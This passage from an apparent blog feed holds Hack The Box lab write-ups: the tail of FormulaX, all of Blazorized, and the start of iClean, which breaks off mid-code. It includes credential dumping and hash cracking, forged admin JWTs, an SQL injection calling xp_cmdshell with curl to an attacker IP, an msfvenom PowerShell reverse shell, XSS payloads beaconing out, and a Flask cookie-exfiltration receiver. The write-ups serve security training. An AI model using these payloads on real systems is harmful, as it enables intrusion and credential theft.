+ADMIN_EMAIL=&quot;admin@chatbot.htb&quot;</code></pre><figcaption>/var/www/app/.env</figcaption></figure><p>We can find more info about the MongoDB configuration in the <code>connect_db.js</code> file:</p><figure class="kg-card kg-code-card"><pre><code>import mongoose from &quot;mongoose&quot;;
+
+const connectDB= async(URL_DATABASE)=&gt;{
+    try{
+        const DB_OPTIONS={
+            dbName : &quot;testing&quot;
+        }
+        mongoose.connect(URL_DATABASE,DB_OPTIONS)
+        console.log(&quot;Connected Successfully TO Database&quot;)
+    } catch(error){
+        console.log(`Error Connecting to the ERROR ${error}`);
+    }
+}</code></pre><figcaption>/var/www/app/configuration/connect_db.js</figcaption></figure><p>As shown above, we don&apos;t need a password to be able to connect to the <code>testing</code> database.</p><pre><code>$ netstat -tunpl | grep 27017
+tcp     0     0     127.0.0.1:27017     0.0.0.0:*     LISTEN     -
+
+$ which mongo
+/usr/bin/mongo
+
+$ /usr/bin/mongo
+MongoDB shell version v4.4.29
+connecting to: mongodb://127.0.0.1:27017/?
+[...]
+
+&gt; show dbs;
+admin    0.000GB
+config   0.000GB
+local    0.000GB
+testing  0.000GB
+
+&gt; use testing;
+switched to db testing
+
+&gt; show collections;
+messages
+users
+
+&gt; db.users.find()
+{ &quot;_id&quot; : ObjectId(&quot;648874de313b8717284f457c&quot;), &quot;name&quot; : &quot;admin&quot;, &quot;email&quot; : &quot;admin@chatbot.htb&quot;, &quot;password&quot; : &quot;$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&quot;, &quot;terms&quot; : true, &quot;value&quot; : true, &quot;authorization_token&quot; : &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjI1OTU2NDd9.iwgmNmvtm1s6WYvy4AbElQ1Hz3bvnd6UKkT2pHTntrs&quot;, &quot;__v&quot; : 0 }
+{ &quot;_id&quot; : ObjectId(&quot;648874de313b8717284f457d&quot;), &quot;name&quot; : &quot;frank_dorky&quot;, &quot;email&quot; : &quot;frank_dorky@chatbot.htb&quot;, &quot;password&quot; : &quot;$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&quot;, &quot;terms&quot; : true, &quot;value&quot; : true, &quot;authorization_token&quot; : &quot; &quot;, &quot;__v&quot; : 0 }</code></pre><p>So, we have an encrypted password for the <code>admin</code> user, but this is not super relevant since the unencrypted version is hardcoded in the source code, and we can confirm it&apos;s not valid for <code>SSH</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-javascript">// [...]
+await page.goto(&apos;http://chatbot.htb/static/index.html&apos;, { timeout: 30000 });
+// [...]
+await page.type(&apos;#email&apos;, &apos;admin@chatbot.htb&apos;);
+await page.type(&apos;#password&apos;, &apos;iamnottheadmin$&apos;);
+// [...]</code></pre><figcaption>/var/www/automation/index.js</figcaption></figure><p>So this leaves us with the <code>frank_dorky</code> encrypted password:</p><pre><code>~ hashcat -a 0 -m 3200 frank_hash.txt rockyou-75.txt --status --status-timer=10 -w 3</code></pre><pre><code>~ ssh frank_dorky@chatbot.htb
+frank_dorky@chatbot.htb&apos;s password:
+&gt; manchesterunited
+
+frank_dorky@formulax:~$</code></pre>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Blazorized (user-only)]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/Blazorized">here</a>.</em></p><hr><h2 id="enumeration">Enumeration</h2><pre><code>~ nmap -F 10.10.11.22 -Pn
+
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s</code></pre><p>Port</p>]]></description><link>inesmartins.github.io/htb-writeup-blazorized/</link><guid isPermaLink="false">66b0ae8a29acb9fd804defc0</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 13 Nov 2024 13:30:46 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/08/Blazorized.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/08/Blazorized.png" alt="HTB Write-up | Blazorized (user-only)"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/Blazorized">here</a>.</em></p><hr><h2 id="enumeration">Enumeration</h2><pre><code>~ nmap -F 10.10.11.22 -Pn
+
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s</code></pre><p>Port <code>80</code> redirects to <a href="http://blazorized.htb/">http://blazorized.htb/</a>, which means this virtual host needs to be mapped in order for us to be able to access the web application.</p><pre><code>~ sudo nano /etc/hosts
+
+[...]
+10.10.11.22 blazorized.htb</code></pre><p>The website is built using <a href="https://dotnet.microsoft.com/en-us/apps/aspnet/web-apps/blazor">Blazor WebAssembly</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-11.59.30.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1439" height="714" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-11.59.30.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-11.59.30.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-11.59.30.png 1439w" sizes="(min-width: 1200px) 1200px"></figure><blockquote>Blazor is a feature of ASP.NET for building interactive web UIs using C# instead of JavaScript. It&apos;s real .NET running in the browser on <em>WebAssembly.</em></blockquote><p>It looks like we can temporarily &quot;impersonate&quot; the <code>super admin</code> user:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.01.41.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1152" height="466" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.01.41.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.01.41.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.01.41.png 1152w" sizes="(min-width: 720px) 720px"></figure><p>This button performs <code>GET</code> requests to <a href="http://api.blazorized.htb/posts">http://api.blazorized.htb/posts</a> and <a href="http://api.blazorized.htb/categories">http://api.blazorized.htb/categories</a> with an <code>authorization</code> header that contains a bearer token:</p><pre><code>authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzIyODU2MzAyLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.J4bJYYN3EkV-PfFWJ90yAyOFS158LOanNLTduowSPHdYv28W7GQ59zeadaRaCZsyM_cfDH5r_tGXD0Mf43AUwA</code></pre><p>At this point, I&apos;m not sure how this token is being generated because it doesn&apos;t seem to be retrieved from the API, and it&apos;s not hardcoded in any of the resource files, so there&apos;s probably some Blazor magic under the hood.</p><p>We can use <a href="https://github.com/hahwul/jwt-hack">jwt-hack</a> to decode it:</p><pre><code>~ jwt-hack decode &lt;the-token&gt;
+
+INFO[0000] Decoded data(claims)
+
+header=&quot;{\&quot;alg\&quot;:\&quot;HS512\&quot;,\&quot;typ\&quot;:\&quot;JWT\&quot;}&quot; 
+method=&quot;&amp;{HS512 SHA-512}&quot;
+
+INFO[0000] Expiraton Time
+EXP=1722856302 TIME=&quot;1970-01-01 01:00:01.722856302 +0100 CET&quot;
+
+{
+    &quot;aud&quot;:&quot;http://api.blazorized.htb&quot;,
+    &quot;exp&quot;:1722856302,
+    &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;:[
+       &quot;Posts_Get_All&quot;,
+       &quot;Categories_Get_All&quot;
+    ],
+    &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;:&quot;superadmin@blazorized.htb&quot;,
+    &quot;iss&quot;:&quot;http://api.blazorized.htb&quot;
+}</code></pre><p>We can see that this token was generated for a user with the <code>superadmin@blazorized.htb</code> email, and has the following &quot;claims&quot;: <code>Posts_Get_All</code> and <code>Categories_Get_All</code>.</p><p>We can also see from the API responses that the posts&apos; content is formatted in Markdown:</p><pre><code class="language-json">{
+   &quot;Posts&quot;:[
+      {
+         &quot;ID&quot;:&quot;1c391f9c-fd3e-4d86-b966-9a3e5d7e3d28&quot;,
+         &quot;Title&quot;:&quot;Active Directory&quot;,
+         &quot;MarkdownContent&quot;:&quot;Below are links to projects and posts relating AD red-teaming:\r\n\r\n- https://github.com/Group3r/Group3r\r\n- https://github.com/Leo4j/Amnesiac\r\n- https://github.com/JPG0mez/ADCSync\r\n- https://github.com/Processus-Thief/HEKATOMB\r\n- https://github.com/Mazars-Tech/AD_Miner\r\n- https://github.com/AlmondOffSec/PassTheCert\r\n- https://github.com/synacktiv/ntdissector\r\n- https://github.com/Hackndo/pyGPOAbuse\r\n- https://exploit.ph/external-trusts-are-evil.html\r\n- https://github.com/SecuraBV/Timeroast\r\n- https://github.com/SadProcessor/CypherDog\r\n- https://mayfly277.github.io/&quot;,&quot;CategoryID&quot;:&quot;9a445790-f7e8-4351-8cf4-46fcae383eec&quot;},
+...
+}</code></pre><p>This means that the front-end is somehow processing and displaying this Markdown, which may result in stored XSS if we&apos;re able to create or manipulate posts or categories:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.28.14.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1431" height="715" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.28.14.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.28.14.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.28.14.png 1431w" sizes="(min-width: 1200px) 1200px"></figure><p>This suspicion is further confirmed because the Markdown &quot;playground&quot; is vulnerable to DOM-based XSS:</p><pre><code class="language-html">&lt;img src=x onerror=alert(1) /&gt; </code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.17.47.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1123" height="496" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.17.47.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.17.47.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.17.47.png 1123w" sizes="(min-width: 720px) 720px"></figure><p>However, only the <code>GET</code> method seems to be allowed for <code>/posts</code> and <code>/categories</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.39.10.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="944" height="437" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.39.10.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.39.10.png 944w" sizes="(min-width: 720px) 720px"></figure><p>When we try to request a non-existent post ID, we see that all of the application&apos;s DLLs and other source files are available under the <code>_framework</code> directory:</p><pre><code>http://blazorized.htb/post/1
+
+http://blazorized.htb/_framework/blazor.boot.json
+http://blazorized.htb/_framework/Blazored.LocalStorage.dll
+http://blazorized.htb/_framework/Blazorized.DigitalGarden.dll
+http://blazorized.htb/_framework/Blazorized.Shared.dll
+...</code></pre><p>Let&apos;s download all of these files to a local dir ...</p><pre><code>~ wget -i requests.txt</code></pre><p>... so we can use the <a href="https://marketplace.visualstudio.com/items?itemName=icsharpcode.ilspy-vscode">ilspy-vscode extension</a> to decompile the relevant source code.</p><p>It looks like the <code>Blazorized.Helpers</code> namespace has a <code>JWT</code> class that contains the logic for the temporary token generation, as well as a new interesting subdomain:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-13.24.44.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1441" height="710" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-13.24.44.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-13.24.44.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-13.24.44.png 1441w" sizes="(min-width: 1200px) 1200px"></figure><p>Note that this application is built with <a href="https://learn.microsoft.com/en-us/aspnet/core/blazor/hosting-models?view=aspnetcore-8.0#blazor-server">Blazor Server</a>, instead of Blazor WebAssembly:</p><blockquote>With the Blazor Server hosting model, components are executed on the server from within an ASP.NET Core app. UI updates, event handling, and JavaScript calls are handled over a <a href="https://learn.microsoft.com/en-us/aspnet/core/signalr/introduction?view=aspnetcore-8.0">SignalR</a> connection using the <a href="https://learn.microsoft.com/en-us/aspnet/core/fundamentals/websockets?view=aspnetcore-8.0">WebSockets protocol</a>. <em>[...]</em></blockquote><p>It&apos;s unlikely, but possible, that the JWT we have is a valid form of authorization for this subdomain. </p><p>We can see that there are 2 different &quot;audiences&quot; in the source code: <code>apiAudience</code> and <code>adminDashboardAudience</code>.</p><p>We can guess that the <code>temporary</code> token we&apos;ve previously come across is generated using the following function:</p><pre><code>public static string GenerateTemporaryJWT(long expirationDurationInSeconds = 60L)
+{
+    try
+    {
+        List&lt;Claim&gt; claims = new List&lt;Claim&gt;
+        {
+            new Claim(&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;, superAdminEmailClaimValue),
+            new Claim(&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;, postsPermissionsClaimValue),
+            new Claim(&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;, categoriesPermissionsClaimValue)
+        };
+        SigningCredentials signingCredentials = GetSigningCredentials();
+        DateTime? expires = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
+        JwtSecurityToken token = new JwtSecurityToken(issuer, apiAudience, claims, null, expires, signingCredentials);
+        return new JwtSecurityTokenHandler().WriteToken(token);
+    }
+    catch (Exception)
+    {
+        throw;
+    }
+}
+</code></pre><p>But there is another function, which generates a token for the same email address but for the <code>adminDashboardAudience</code>, and with the <code>superAdminRoleClaimValue</code> claim:</p><pre><code>using System;
+using System.Collections.Generic;
+using System.IdentityModel.Tokens.Jwt;
+using System.Security.Claims;
+using Microsoft.IdentityModel.Tokens;
+
+public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60L)
+{
+    try
+    {
+        List&lt;Claim&gt; claims = new List&lt;Claim&gt;
+        {
+            new Claim(&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;, superAdminEmailClaimValue),
+            new Claim(&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;, superAdminRoleClaimValue)
+        };
+        SigningCredentials signingCredentials = GetSigningCredentials();
+        DateTime? expires = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
+        JwtSecurityToken token = new JwtSecurityToken(issuer, adminDashboardAudience, claims, null, expires, signingCredentials);
+        return new JwtSecurityTokenHandler().WriteToken(token);
+    }
+    catch (Exception)
+    {
+        throw;
+    }
+}
+</code></pre><p>Let&apos;s create a new .NET project, import the relevant DLLs, and try to generate a valid token (we increased the expiration to 600000 seconds, to make testing easier):</p><figure class="kg-card kg-code-card"><pre><code class="language-C#">using Blazorized.Helpers;
+
+namespace BlazorJWTMock
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine(&quot;Generating super admin token ...&quot;);
+            Console.WriteLine(JWT.GenerateSuperAdminJWT(600000));
+            Console.WriteLine(&quot;Done!&quot;);
+        }
+    }
+}</code></pre><figcaption>BlazorJWTMock/Program.cs</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>&lt;Project Sdk=&quot;Microsoft.NET.Sdk&quot;&gt;
+  &lt;PropertyGroup&gt;
+    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
+    &lt;TargetFramework&gt;net7.0&lt;/TargetFramework&gt;
+    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
+    &lt;Nullable&gt;enable&lt;/Nullable&gt;
+  &lt;/PropertyGroup&gt;
+  &lt;ItemGroup&gt;
+    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Blazored.LocalStorage.dll&quot; /&gt;
+    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Blazorized.DigitalGarden.dll&quot; /&gt;
+    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Blazorized.Helpers.dll&quot; /&gt;
+    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Microsoft.IdentityModel.Tokens.dll&quot; /&gt;
+    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Microsoft.IdentityModel.JsonWebTokens.dll&quot; /&gt;
+    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/System.IdentityModel.Tokens.Jwt.dll&quot; /&gt;
+  &lt;/ItemGroup&gt;
+&lt;/Project&gt;</code></pre><figcaption>BlazorJWTMock/BlazorJWTMock.csproj</figcaption></figure><pre><code>~ dotnet run --project BlazorJwtMock/BlazorJwtMock.csproj
+
+Generating admin token ...
+
+eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJleHAiOjE3MjI4NzgyNzUsImlzcyI6Imh0dHA6Ly9hcGkuYmxhem9yaXplZC5odGIiLCJhdWQiOiJodHRwOi8vYWRtaW4uYmxhem9yaXplZC5odGIifQ.XUlzWUdD04FGiWCOP_SbsULNGCDVNRmvmSlAAEi2SCJNmUNf9irKVmtvyReIl0tqN8WwcvkrqWxAOO3RMXZONw
+
+Done!</code></pre><p>Ok, we have a token, but we&apos;re not sure how to use it to authenticate in the <code>admin</code> subdomain.</p><p>Even after reversing every DLL that looked relevant, I couldn&apos;t find the logic that was responsible for getting or setting this token, so I decided to fuzz this parameter, as recommended in the forum:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-06-at-10.46.49.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="783" height="438" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-06-at-10.46.49.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-06-at-10.46.49.png 783w" sizes="(min-width: 720px) 720px"></figure><p>The solution was to add this JWT to the <code>jwt</code> LocalStorage value:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-06-at-10.37.36.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1633" height="652" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-06-at-10.37.36.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1000w, inesmartins.github.io/content/images/size/w1600/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1633w" sizes="(min-width: 1200px) 1200px"></figure><hr><h2 id="from-admin-to-foothold">From Admin to Foothold</h2><p>We have an obvious clue from the <code>/home</code> page:</p><blockquote>To avoid latency issues, this super admin panel does not consume the API but speaks to the database directly.</blockquote><p>We can see that the &quot;Check Duplicate&quot; features are vulnerable to SQLi, and we know from the initial <code>nmap</code> scan that we&apos;re dealing with a MSSQL database, so let&apos;s try to get a request from the victim machine using a stacked query and the <code>EXEC master.dbo.xp_cmdshell</code> command, e.g.:</p><pre><code>&apos;;EXEC master.dbo.xp_cmdshell &apos;curl http://10.10.14.91:8000&apos;;--</code></pre><pre><code>~ python3 -m http.server 8000
+::ffff:10.10.11.22 - - [06/Aug/2024 11:58:11] &quot;GET / HTTP/1.1&quot; 200 -</code></pre><p>Alright, let&apos;s try to trigger a reverse shell:</p><pre><code>~ msfvenom -p cmd/windows/reverse_powershell LHOST={local_ip} LPORT={local_port} &gt; revshell.txt
+
+# after cleaning up the revshell.txt file and removing &quot;powershell -w hidden -nop -c&quot;
+
+~ iconv -f ASCII -t UTF-16LE revshell.txt | base64 | tr -d &apos;\n&apos;
+JABhAD0AJwAxADAALgAxADAALgAxADQALgA5ADEAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOA...
+
+~ powershell.exe -EncodedCommand JABhAD0AJwAxADAALgAxADAALgAxADQALgA5ADEAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOA...</code></pre><p>and we get a shell!</p><pre><code>~ nc -l 4444
+Microsoft Windows [Version 10.0.17763.5936]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+blazorized\nu_1055
+
+C:\Windows\system32&gt; cd Users
+C:\Users&gt; dir
+02/25/2024  03:41 PM    &lt;DIR&gt;          NU_1055
+...
+
+C:\Users&gt;type C:\Users\NU_1055\Desktop\user.txt</code></pre><p>We didn&apos;t even have to pivot to get the user flag! :)</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | iClean (user-only)]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/IClean">here</a>.</em></p><hr><p>Let&apos;s start with a basic scan:</p><pre><code>~ nmap -F 10.10.11.12
+
+22/tcp open  ssh
+80/tcp open  http</code></pre><p><a href="10.10.11.12">10.10.11.12</a> redirects to capiclean.htb, so let&apos;s map out this domain.</p><pre><code>~ sudo nano /etc/hosts
+
+10.10.</code></pre>]]></description><link>inesmartins.github.io/htb-writeup-iclean/</link><guid isPermaLink="false">66acd79382fc3c3df851727b</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 04 Aug 2024 14:31:06 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/08/IClean.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/08/IClean.png" alt="HTB Write-up | iClean (user-only)"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/IClean">here</a>.</em></p><hr><p>Let&apos;s start with a basic scan:</p><pre><code>~ nmap -F 10.10.11.12
+
+22/tcp open  ssh
+80/tcp open  http</code></pre><p><a href="10.10.11.12">10.10.11.12</a> redirects to capiclean.htb, so let&apos;s map out this domain.</p><pre><code>~ sudo nano /etc/hosts
+
+10.10.11.12 capiclean.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.07.50.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1256" height="819" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-14.07.50.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-14.07.50.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.07.50.png 1256w" sizes="(min-width: 1200px) 1200px"><figcaption>http://capiclean.htb/</figcaption></figure><p>The login page is very simple:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.08.04.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1264" height="774" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-14.08.04.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-14.08.04.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.08.04.png 1264w" sizes="(min-width: 720px) 720px"></figure><pre><code>POST /login HTTP/1.1
+Host: capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+username=admin&amp;password=admin</code></pre><p>From the &quot;Team&quot; page we can see the names of at least some of the cleaners.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.19.57.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1196" height="749" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-14.19.57.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-14.19.57.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.19.57.png 1196w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s see if we can get a different server response when trying to log in with any of these users:</p><p><a href="https://github.com/urbanadventurer/username-anarchy">https://github.com/urbanadventurer/username-anarchy</a></p><pre><code>~ username-anarchy mary pikes
+~ username-anarchy mary pikes --suffix capiclean.htb
+~ username-anarchy martha smith
+~ username-anarchy martha smith --suffix capiclean.htb
+~ username-anarchy jasmine summers
+~ username-anarchy jasmine summers --suffix capiclean.htb
+~ username-anarchy mike samuels
+~ username-anarchy mike samuels --suffix capiclean.htb
+</code></pre><p>All of the above return a generic error message, and there is no consistent time difference in the response.</p><p>Directory enumeration with <code>gobuster</code> didn&apos;t find much except a <code>dashboard</code> page, which likely requires authentication.</p><pre><code>~ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-big.txt
+
+~ gobuster dir -u http://capiclean.htb/ -w directory-list-2.3-big.txt -s &quot;200,204,301,302,307,401,403,405,500&quot;
+
+/about                (Status: 200) [Size: 5267]
+/login                (Status: 200) [Size: 2106]
+/services             (Status: 200) [Size: 8592]
+/team                 (Status: 200) [Size: 8109]
+/quote                (Status: 200) [Size: 2237]
+/logout               (Status: 302) [Size: 189] [--&gt; /]
+/dashboard            (Status: 302) [Size: 189] [--&gt; /]
+/choose               (Status: 200) [Size: 6084]
+/server-status        (Status: 403) [Size: 278]</code></pre><p>The <code>quote</code> page also sends a very simple request:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.09.48.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1262" height="790" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-14.09.48.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-14.09.48.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.09.48.png 1262w" sizes="(min-width: 720px) 720px"></figure><pre><code>POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+
+service=Carpet+Cleaning&amp;service=Tile+%26+Grout&amp;service=Office+Cleaning&amp;email=test%40htb.com</code></pre><p>Testing these fields for XSS we get a hit on all the ports defined for the <code>service</code> parameter:</p><pre><code>POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+
+service=&lt;img%20src=&apos;http://10.10.14.69:9001&apos;/&gt;&amp;service=&lt;img%20src=&apos;http://10.10.14.69:9002&apos;/&gt;&amp;service=&lt;img%20src=&apos;http://10.10.14.69:9003&apos;/&gt;&amp;email=&lt;img%20src=&apos;http://10.10.14.69:9004&apos;/&gt;</code></pre><hr><h2 id="from-xss-to-auth-bypass">From XSS to Auth Bypass</h2><p>Let&apos;s try to steal some cookies!</p><p>First, I&apos;ll setup a simple Flask API to receive POST requests from the injected JavaScript payload:</p><pre><code class="language-python">import json
+from flask import Flask, request
+from flask_cors import CORS
+from urllib.parse import unquote
+import base64
+
+app = Flask(__name__)
+CORS(app)
+
+@app.route(&apos;/api/exfil&apos;, methods=[&apos;POST&apos;])
+def exfil():
+    print(&quot;[+] Received data &quot;)
+    encoding = request.args.get(&apos;encoding&apos;)
+    data = request.form.get(&apos;data&apos;)
+    try:
+        decoded_data = unquote(unquote(data))
+        if encoding is not None and encoding == &apos;base64&apos;:
+            print(base64.b64decode(decoded_data))
+        else:
+            print(decoded_data)
+    except Exception as exception:
+        print(f&apos;Something went wrong: {exception}&apos;)
+        return json.dumps({&apos;success&apos;:False}), 500, {&apos;ContentType&apos;:&apos;application/json&apos;}
+    return json.dumps({&apos;success&apos;:True}), 200, {&apos;ContentType&apos;:&apos;application/json&apos;}
+
